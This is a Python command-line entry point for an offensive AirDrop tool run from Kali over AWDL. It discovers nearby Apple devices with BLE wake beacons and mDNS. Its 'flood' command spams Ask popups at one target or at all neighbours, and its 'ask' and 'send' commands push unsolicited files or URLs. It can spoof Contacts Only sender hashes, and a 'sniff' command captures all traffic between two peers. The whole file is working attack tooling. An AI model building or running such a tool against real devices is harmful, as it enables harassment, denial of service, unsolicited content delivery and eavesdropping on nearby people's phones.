#!/usr/bin/env python3
"""
airdrop-standalone — AirDrop flood / Ask / Upload over AWDL (modular build)

Prerequisites (terminal 1):
    sudo airmon-ng check kill && sudo airmon-ng start wlan0
    sudo owl -i wlan0mon -N

Run (terminal 2, as root):
    sudo python3 main.py find                    # loop until Ctrl+C, then save
    sudo python3 main.py find --dbg              # verbose debug
    sudo python3 main.py find --once --duration 20   # single 20s pass
    sudo python3 main.py flood --target fe80::xxxx:xxxx:xxxx:xxxx
    sudo python3 main.py flood --target ... --slow   # legacy flood engine
    sudo python3 main.py ask   --target fe80::xxxx:xxxx:xxxx:xxxx -n "Kali"
    sudo python3 main.py send  --target fe80::xxxx:xxxx:xxxx:xxxx -f poke.txt
    sudo python3 main.py send  --target fe80::xxxx:xxxx:xxxx:xxxx -u https://example.com
    sudo python3 main.py flood --all -i awdl0

TLS keys: Stand_alone/keys/ (auto-copied from ../opendrop/keys if present)

Module layout (all in this folder):
    config.py      paths, logging, TLS keys, Ctrl+C handling
    constants.py   PCAP-derived packet templates + network constants
    netutil.py     IPv6/socket helpers + companion-link packet patching
    peers.py       PeerPorts / FoundDevice data models
    ble.py         BLE wake beacon
    discovery.py   mDNS discovery + TLS /Discover
    modern.py      companion-link (TCP) + asquic (UDP) path
    legacy.py      TLS :8770 (OpenDrop-compatible) path
    actions.py     routing + stock flood engine
    fastnet.py     concurrent probing + fast flood engine
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
from pathlib import Path

import config
from config import DISCOVER_JSON, log, resolve_key_dir, set_debug
from constants import DEFAULT_IFACE
from netutil import enum_neighbors
from peers import FoundDevice, found_device_to_ports, load_peer_from_discover, ports_direct
from discovery import discover_ports, find_devices, print_found_devices
from ble import brief_ble_wake
from modern import ModernAirDrop
from legacy import load_record_data, resolve_ask_file
from actions import execute_airdrop_action, flood_peers
from fastnet import fast_flood, fast_open_companion_ports
from sniffer import sniff_device


def preflight(iface: str) -> None:
    if os.geteuid() != 0:
        log("run with sudo", level="err")
        sys.exit(1)
    if not Path(f"/sys/class/net/{iface}").exists():
        log(f"{iface} missing — start owl first: sudo owl -i wlan0mon -N", level="err")
        sys.exit(1)
    try:
        out = subprocess.check_output(["pgrep", "-x", "owl"], text=True)
        if out.strip():
            log("owl is running")
        else:
            log("owl not detected — start: sudo owl -i wlan0mon -N", level="warn")
    except (OSError, subprocess.SubprocessError):
        log("could not check owl", level="dbg")


def build_parser() -> argparse.ArgumentParser:
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument(
        "-i", "--iface", default=DEFAULT_IFACE,
        help="AWDL interface (default: awdl0)",
    )
    common.add_argument(
        "--target",
        metavar="IPv6",
        help="Target link-local IPv6 (e.g. fe80::aaaa:bbbb:cccc:dddd). Skips mDNS when set.",
    )
    common.add_argument(
        "--all", action="store_true",
        help="Use all awdl0 neighbors from ip -6 neigh (flood only)",
    )
    common.add_argument(
        "--apple-id",
        metavar="EMAIL",
        help="Apple ID email -> SenderEmailHash (Contacts Only receivers; skip for Everyone)",
    )
    common.add_argument(
        "--phone",
        metavar="NUMBER",
        help="Phone number -> SenderPhoneHash (Contacts Only; e.g. +66123456789)",
    )
    common.add_argument(
        "--record-data", type=Path, metavar="FILE",
        help="SenderRecordData CMS blob signed by Apple (optional; Contacts Only)",
    )
    common.add_argument(
        "--legacy-tls", action="store_true",
        help="Prefer HTTPS TLS :8770 path (OpenDrop-style; good for Mac / direct --target)",
    )
    common.add_argument(
        "--timeout", type=float, default=5.0, metavar="SEC",
        help="Socket/TLS timeout in seconds (default: 5)",
    )
    common.add_argument(
        "--dbg", action="store_true",
        help="Verbose debug (mDNS, BLE, TLS, companion-link)",
    )

    p = argparse.ArgumentParser(
        prog="stand_alone.py",
        description="Standalone AirDrop CLI — find, flood, ask, send over AWDL (owl + awdl0)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Prerequisites:\n"
            "  sudo owl -i wlan0mon -N\n"
            "  iPhone: AirDrop = Everyone, share sheet open, screen unlocked\n\n"
            "Quick start:\n"
            "  sudo python3 stand_alone.py find\n"
            "  sudo python3 stand_alone.py send --target fe80::... -f poke.txt\n\n"
            "Use '<command> -h' for per-command help (e.g. find -h, send -h)."
        ),
        parents=[common],
    )
    sub = p.add_subparsers(
        dest="cmd",
        required=True,
        metavar="{find,flood,ask,send,sniff,neigh}",
        title="commands",
    )

    fd = sub.add_parser(
        "find",
        parents=[common],
        help="Discover receivers (BLE wake + mDNS; Ctrl+C to save)",
        description=(
            "Loop BLE wake + mDNS browse until Ctrl+C, then print devices and save "
            f"{DISCOVER_JSON.name}."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 stand_alone.py find\n"
            "  sudo python3 stand_alone.py find --dbg\n"
            "  sudo python3 stand_alone.py find --once --duration 20\n"
            "  sudo python3 stand_alone.py find --no-ble --no-discover\n\n"
            "Ctrl+C once: stop scan and save. Ctrl+C twice: force quit."
        ),
    )
    fd.add_argument(
        "--duration", type=float, default=5.0, metavar="SEC",
        help="Seconds per scan round (default: 5; loops until Ctrl+C)",
    )
    fd.add_argument(
        "--once", action="store_true",
        help="Single scan pass then exit (no continuous loop)",
    )
    fd.add_argument(
        "--hci", default="hci0", metavar="DEV",
        help="Bluetooth adapter for BLE wake beacon (default: hci0)",
    )
    fd.add_argument(
        "--no-ble", action="store_true",
        help="Skip BLE wake beacon (mDNS only)",
    )
    fd.add_argument(
        "--no-discover", action="store_true",
        help="Skip TLS /Discover name lookup at end",
    )

    f = sub.add_parser(
        "flood",
        parents=[common],
        help="Spam Ask popups to target(s)",
        description="Repeatedly send AirDrop Ask popups. Requires --target or --all.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 stand_alone.py flood --target fe80::...\n"
            "  sudo python3 stand_alone.py flood --all --delay 1.0\n"
            "  sudo python3 stand_alone.py flood --target fe80::... --legacy-tls --ask-only"
        ),
    )
    f.add_argument(
        "-n", "--name", metavar="NAME",
        help="Fixed sender name (default: random per attempt)",
    )
    f.add_argument(
        "-f", "--file", type=Path, metavar="FILE",
        help="Optional file path for upload attempts (not just Ask)",
    )
    f.add_argument(
        "--ask-only", action="store_true",
        help="Ask popup only; do not attempt file upload",
    )
    f.add_argument(
        "--workers", type=int, default=2, metavar="N",
        help="Parallel worker threads (default: 2; keep low on AX200)",
    )
    f.add_argument(
        "--delay", type=float, default=0.8, metavar="SEC",
        help="Seconds between flood attempts (default: 0.8)",
    )
    f.add_argument(
        "--slow", action="store_true",
        help="Use the legacy thread-per-attempt flood engine (default: fast bounded engine)",
    )

    ask_p = sub.add_parser(
        "ask",
        parents=[common],
        help="Single Ask popup (no upload)",
        description="Send one AirDrop Ask. Use --target for direct TLS :8770 (opendrop mode).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 stand_alone.py ask --target fe80::... -n 'Kali'\n"
            "  sudo python3 stand_alone.py ask --target fe80::... -u https://example.com\n"
            "  sudo python3 stand_alone.py ask --target fe80::... -f poke.txt --dbg"
        ),
    )
    ask_p.add_argument(
        "-n", "--name", default="Kali AirDrop", metavar="NAME",
        help="Sender name shown on receiver (default: Kali AirDrop)",
    )
    ask_p.add_argument(
        "--hci", default="hci0", metavar="DEV",
        help="Bluetooth adapter for pre-ask BLE wake (default: hci0)",
    )
    ask_p.add_argument(
        "--no-ble", action="store_true",
        help="Skip BLE wake before ask (direct --target skips BLE anyway)",
    )
    ask_p.add_argument(
        "-u", "--url", metavar="URL",
        help="Send URL in Ask plist (Items=); no /Upload",
    )
    ask_p.add_argument(
        "-f", "--file", type=Path, metavar="FILE",
        help="Probe filename for Ask plist (default: /tmp/poke.txt); not uploaded",
    )
    ask_p.add_argument(
        "--accept-wait", type=float, default=0.0, metavar="SEC",
        help="Ignored for ask-only (use with send for upload timing)",
    )

    s = sub.add_parser(
        "send",
        parents=[common],
        help="Ask + upload file, or send URL via Ask only",
        description=(
            "Send a file (POST /Ask then /Upload) or URL (POST /Ask with Items= only). "
            "With --target, skips mDNS and /Discover (same as opendrop --target)."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 stand_alone.py send --target fe80::... -f poke.txt\n"
            "  sudo python3 stand_alone.py send --target fe80::... -f poke.txt --accept-wait 0\n"
            "  # iPhone: run find first, keep AirDrop open, then send file immediately\n"
            "  sudo python3 stand_alone.py find   # Ctrl+C when device listed\n"
            "  sudo python3 stand_alone.py send --target fe80::... -f poke.txt --dbg\n"
            "  sudo python3 stand_alone.py send --target fe80::... -u https://example.com\n"
            "  sudo python3 stand_alone.py send --target fe80::... -f poke.txt --ble --dbg\n\n"
            "After popup appears: tap Accept, then press Enter (--accept-wait 0)."
        ),
    )
    payload = s.add_mutually_exclusive_group(required=True)
    payload.add_argument(
        "-f", "--file", type=Path, metavar="FILE",
        help="Local file to send via /Ask + /Upload",
    )
    payload.add_argument(
        "-u", "--url", metavar="URL",
        help="HTTPS URL to send via /Ask only (no /Upload)",
    )
    s.add_argument(
        "-n", "--name", default="Kali AirDrop", metavar="NAME",
        help="Sender name shown on receiver (default: Kali AirDrop)",
    )
    s.add_argument(
        "--hci", default="hci0", metavar="DEV",
        help="Bluetooth adapter when --ble is used (default: hci0)",
    )
    s.add_argument(
        "--ble", action="store_true",
        help="Run BLE wake 5s before send (off by default; --target usually does not need it)",
    )
    s.add_argument(
        "--accept-wait", type=float, default=0.0, metavar="SEC",
        help="0 = press Enter after Accept on iPhone; >0 = auto-wait N seconds before /Upload",
    )

    sn = sub.add_parser(
        "sniff",
        parents=[common],
        help="Capture all traffic to/from one IPv6 peer, save pcap",
        description=(
            "Sniff every on-air packet where --target IPv6 is source or destination, "
            "print raw payload, and optionally write a .pcap for Wireshark."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 stand_alone.py sniff --target fe80::... -w capture.pcap\n"
            "  sudo python3 stand_alone.py sniff --target fe80::A --peer fe80::B -w a_b.pcap\n"
            "  sudo python3 stand_alone.py sniff --target fe80::... --duration 30\n"
            "  sudo python3 stand_alone.py sniff --target fe80::... -w out.pcap --filter 'udp'\n"
            "  sudo python3 stand_alone.py sniff --target fe80::... --no-payload -c 100"
        ),
    )
    sn.add_argument(
        "-p", "--peer", metavar="IPv6",
        help="Second device IPv6 — capture only traffic BETWEEN --target and --peer (both directions)",
    )
    sn.add_argument(
        "-w", "--write", type=Path, metavar="FILE",
        help="Write captured packets to a .pcap file (open in Wireshark)",
    )
    sn.add_argument(
        "--duration", type=float, default=0.0, metavar="SEC",
        help="Auto-stop after N seconds (default: 0 = until Ctrl+C)",
    )
    sn.add_argument(
        "-c", "--count", type=int, default=0, metavar="N",
        help="Stop after capturing N packets (default: 0 = unlimited)",
    )
    sn.add_argument(
        "--no-payload", action="store_true",
        help="Only print packet summaries (skip raw payload hexdump)",
    )
    sn.add_argument(
        "--filter", metavar="BPF",
        help="Extra BPF filter ANDed with the host filter (e.g. 'udp', 'tcp port 8770')",
    )
    sn.add_argument(
        "--engine", choices=["auto", "tcpdump", "scapy"], default="auto",
        help="Capture backend: tcpdump=lossless/complete, scapy=live hexdump (default: auto)",
    )
    sn.add_argument(
        "--buffer", type=int, default=8192, metavar="KIB",
        help="tcpdump kernel ring-buffer size in KiB — larger = fewer drops (default: 8192)",
    )

    sub.add_parser(
        "neigh",
        parents=[common],
        help="List IPv6 link-local neighbors on awdl0",
        description="Print addresses from `ip -6 neigh show dev awdl0` (AWDL peers).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example:\n  sudo python3 stand_alone.py neigh\n  sudo python3 stand_alone.py neigh -i awdl0",
    )
    return p


def resolve_peers(args) -> list[str]:
    if args.all:
        peers = enum_neighbors(args.iface)
        if not peers:
            log("no neighbors — wake iPad (airdrop-wake.sh) or open AirDrop", level="warn")
        return peers
    if not args.target:
        log("need --target or --all", level="err")
        sys.exit(1)
    return [args.target.split("%")[0]]


def main() -> None:
    args = build_parser().parse_args()
    set_debug(bool(getattr(args, "dbg", False)))
    if config.DEBUG:
        log("debug mode ON", level="dbg")
    preflight(args.iface)
    resolve_key_dir()

    if args.cmd == "neigh":
        for a in enum_neighbors(args.iface):
            print(a)
        return

    if args.cmd == "sniff":
        if not args.target:
            log("sniff needs --target IPv6 (the device to capture)", level="err")
            sys.exit(1)
        sniff_device(
            args.iface,
            args.target,
            peer=args.peer,
            write=args.write,
            duration=args.duration,
            count=args.count,
            show_payload=not args.no_payload,
            extra_filter=args.filter,
            engine=args.engine,
            buffer_kb=args.buffer,
        )
        return

    if args.cmd == "find":
        log("find: BLE wake + mDNS loop (Ctrl+C to save)")
        log("target: AirDrop=Everyone, screen ON; keep owl running", level="dbg")
        devices: list[FoundDevice] = []
        try:
            devices = find_devices(
                args.iface,
                duration=args.duration,
                hci=args.hci,
                ble_wake=not args.no_ble,
                do_discover=not args.no_discover,
                timeout=max(args.timeout, 8.0),
                continuous=not args.once,
            )
        except KeyboardInterrupt:
            log("force quit")
        print_found_devices(devices)
        report = [d.to_dict() for d in devices]
        try:
            DISCOVER_JSON.write_text(
                json.dumps(report, indent=2, ensure_ascii=False),
                encoding="utf-8",
            )
            log(f"saved {len(report)} device(s) -> {DISCOVER_JSON}")
        except OSError as exc:
            log(f"could not save {DISCOVER_JSON}: {exc}", level="warn")
        return

    peers = resolve_peers(args)
    modern = ModernAirDrop(args.iface, timeout=args.timeout)

    if args.cmd == "flood":
        engine = flood_peers if getattr(args, "slow", False) else fast_flood
        engine(
            peers,
            args.iface,
            file_path=getattr(args, "file", None),
            workers=args.workers,
            delay=args.delay,
            timeout=args.timeout,
            legacy_tls=args.legacy_tls,
            ask_only=args.ask_only,
        )
        return

    peer = peers[0]
    sender = getattr(args, "name", "Kali AirDrop")

    if args.cmd == "ask":
        direct = bool(args.target)
        if not getattr(args, "no_ble", False) and not direct:
            brief_ble_wake(getattr(args, "hci", "hci0"), 5.0)
        if direct:
            ports = ports_direct(peer)
            log(f"Ask -> {peer} (direct TLS :8770, opendrop mode)")
        else:
            ports = discover_ports(peer, args.iface)
            open_companion = fast_open_companion_ports(ports, args.iface)
            if open_companion:
                ports.clink = open_companion[0]
            log(f"Ask -> {peer}")
        ask_url = getattr(args, "url", None)
        ask_file = getattr(args, "file", None)
        if ask_url and ask_file:
            log("use --url or --file, not both", level="err")
            sys.exit(1)
        ok = execute_airdrop_action(
            peer, ports, args.iface, sender, modern,
            file_path=resolve_ask_file(ask_file or Path("/tmp/poke.txt")) if not ask_url else None,
            url=ask_url,
            do_upload=False, direct=direct,
            accept_wait=getattr(args, "accept_wait", 0.0),
            apple_id=getattr(args, "apple_id", None),
            phone=getattr(args, "phone", None),
            record_data=load_record_data(getattr(args, "record_data", None)),
        )
        sys.exit(0 if ok else 1)

    if args.cmd == "send":
        direct = bool(args.target)
        if getattr(args, "ble", False):
            log("BLE wake 5s before send ...", level="dbg")
            brief_ble_wake(getattr(args, "hci", "hci0"), 5.0)

        send_url = getattr(args, "url", None)
        send_file = getattr(args, "file", None)
        log(f"send -> {peer} " + (f"url={send_url}" if send_url else f"file={send_file}"))
        if send_file:
            # Ask first — companion port opens on popup; long pre-sniff wastes the window.
            ports = ports_direct(peer)
            cached = load_peer_from_discover(peer)
            if cached:
                hints = found_device_to_ports(cached)
                ports.asquic = hints.asquic or ports.asquic
                if hints.clink:
                    ports.clink = hints.clink
                if hints.prepair:
                    ports.prepair = hints.prepair
            log(
                "file send: /Ask first, discover companion after popup "
                f"(cached asquic={ports.asquic} tls={ports.tls})",
                level="dbg",
            )
        elif direct:
            ports = ports_direct(peer)
            log("direct --target: skip mDNS + /Discover (same as opendrop)", level="dbg")
        else:
            ports = discover_ports(peer, args.iface)
            open_companion = fast_open_companion_ports(ports, args.iface)
            if open_companion:
                ports.clink = open_companion[0]
            log(
                f"companion={ports.companion_candidates()} tls={ports.tls}",
                level="dbg",
            )

        ok = execute_airdrop_action(
            peer, ports, args.iface, sender, modern,
            file_path=send_file,
            url=send_url,
            do_upload=not bool(send_url),
            direct=direct,
            prefer_tls=args.legacy_tls,
            accept_wait=args.accept_wait,
            apple_id=getattr(args, "apple_id", None),
            phone=getattr(args, "phone", None),
            record_data=load_record_data(getattr(args, "record_data", None)),
        )

        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
